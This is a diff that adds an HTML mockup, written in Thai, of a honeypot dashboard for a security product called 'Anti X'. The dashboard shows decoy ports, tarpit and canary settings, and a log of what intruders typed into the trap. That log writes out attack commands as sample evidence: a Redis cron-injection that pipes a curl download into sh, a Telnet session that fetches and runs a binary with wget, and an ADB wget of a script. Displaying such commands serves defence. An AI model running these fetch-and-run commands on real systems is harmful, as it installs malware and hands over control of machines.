@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="th"><head><meta charset="utf-8"><link rel="stylesheet" href="kit.css">
+<style>
+    .cols { display: grid; grid-template-columns: 430px 1fr; gap: 14px; margin-top: 12px; }
+    .port { display: flex; align-items: center; gap: 10px; padding: 9px 4px; border-bottom: 1px solid rgba(120, 170, 255, .1); }
+    .port .mono { width: 56px; font-size: 15px; }
+    .port .n { margin-left: auto; font-family: Kanit; font-size: 15px; }
+    .sw { width: 42px; height: 22px; border-radius: 11px; background: linear-gradient(180deg, #6fe0ff, #2a9fe0); position: relative; flex: none; }
+    .sw::after { content: ""; position: absolute; right: 3px; top: 3px; width: 16px; height: 16px; border-radius: 50%; background: #fff; }
+    .row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid rgba(120, 170, 255, .1); }
+    .term { margin-top: 10px; border-radius: 12px; background: rgba(2, 6, 18, .85); border: 1px solid rgba(120, 170, 255, .25); padding: 12px 14px; font-family: Consolas, monospace; font-size: 12.5px; line-height: 1.7; color: #9fe8b8; }
+    .term .p { color: #ff8a95; }
+    .term .c { color: #8fa3c8; }
+</style></head>
+<body data-on="settings">
+<div class="main">
+    <div class="hdr">
+        <span class="ico">🍯</span>
+        <div><h1>Honeypot · กับดักคนร้าย</h1><p>เปิดพอร์ตล่อที่คนทั่วไปไม่มีทางแตะ ใครแตะ = คนร้ายแน่นอน บล็อกถาวรทันที</p></div>
+        <div class="pills"><span class="pill-pro"></span><span class="pill-guard"></span></div>
+    </div>
+
+    <div class="cols">
+        <div class="panel">
+            <h2>พอร์ตล่อ <small>ใครแตะถูกบล็อกถาวรทุกเครื่อง</small></h2>
+            <div class="port"><span class="sw"></span><span class="mono">23</span>Telnet<span class="n red">412</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">2323</span>Telnet (IoT)<span class="n red">187</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">6379</span>Redis<span class="n red">96</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">9200</span>Elasticsearch<span class="n red">71</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">27017</span>MongoDB<span class="n red">64</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">8291</span>MikroTik Winbox<span class="n red">58</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">7547</span>TR-069 (เราเตอร์)<span class="n red">33</span></div>
+            <div class="port"><span class="sw"></span><span class="mono">5555</span>ADB (Android)<span class="n red">29</span></div>
+            <div class="row" style="margin-top:8px"><span class="sw"></span><div><b style="font-family:Kanit">Tarpit</b><div class="mut">ถ่วงคนร้ายให้ค้างนาน ๆ เปลืองเวลาเขา ไม่ใช่ของเรา</div></div></div>
+            <div class="row"><span class="sw"></span><div><b style="font-family:Kanit">ไฟล์ล่อ (Canary)</b><div class="mut">ใครเปิดไฟล์ล่อในเครื่อง = มีคนอยู่ข้างในแล้ว แจ้งทันที</div></div></div>
+            <div class="row" style="border:0"><span class="sw"></span><div><b style="font-family:Kanit">ตัวดักบน VM</b><div class="mut">ติดตั้งพอร์ตล่อใน VM ที่ดูแลผ่าน SSH ให้ด้วย</div></div></div>
+        </div>
+        <div class="panel">
+            <h2>สิ่งที่คนร้ายพิมพ์ใส่กับดัก <small>เก็บเป็นหลักฐาน · 24 ชม.</small></h2>
+            <div class="row"><span class="tag t-red">บล็อกถาวร</span><span class="mono">203.0.113.8</span><span class="mut">US · พอร์ต 6379 Redis</span><span class="mut" style="margin-left:auto">06:31:10</span></div>
+            <div class="term">
+                <span class="p">›</span> CONFIG SET dir /var/spool/cron/<br>
+                <span class="p">›</span> CONFIG SET dbfilename root<br>
+                <span class="p">›</span> SET x "*/1 * * * * curl -fsSL http://192.0.2.66/x.sh | sh"<br>
+                <span class="c"># Anti X: แตะพอร์ตล่อ → บล็อกถาวรบนเครื่องแม่ + VM 3 เครื่อง + Cloudflare</span>
+            </div>
+            <div class="row" style="margin-top:10px"><span class="tag t-red">บล็อกถาวร</span><span class="mono">198.51.100.12</span><span class="mut">CN · พอร์ต 23 Telnet</span><span class="mut" style="margin-left:auto">06:12:44</span></div>
+            <div class="term">
+                <span class="p">login:</span> root<br>
+                <span class="p">Password:</span> admin123<br>
+                <span class="p">›</span> cd /tmp; wget http://192.0.2.91/mips; chmod +x mips; ./mips<br>
+                <span class="c"># Anti X: tarpit ถ่วงไว้ 14 นาที ก่อนตัดการเชื่อมต่อ</span>
+            </div>
+            <div class="row" style="margin-top:10px"><span class="tag t-red">บล็อกถาวร</span><span class="mono">192.0.2.140</span><span class="mut">NL · พอร์ต 5555 ADB</span><span class="mut" style="margin-left:auto">05:58:02</span></div>
+            <div class="term">
+                <span class="p">›</span> shell: cd /data/local/tmp; busybox wget http://192.0.2.91/w.sh<br>
+                <span class="c"># Anti X: บันทึกคำสั่งไว้ในรายงาน · แจ้งเตือนไปที่มือถือที่จับคู่ไว้</span>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="chrome.js"></script>
+</body></html>
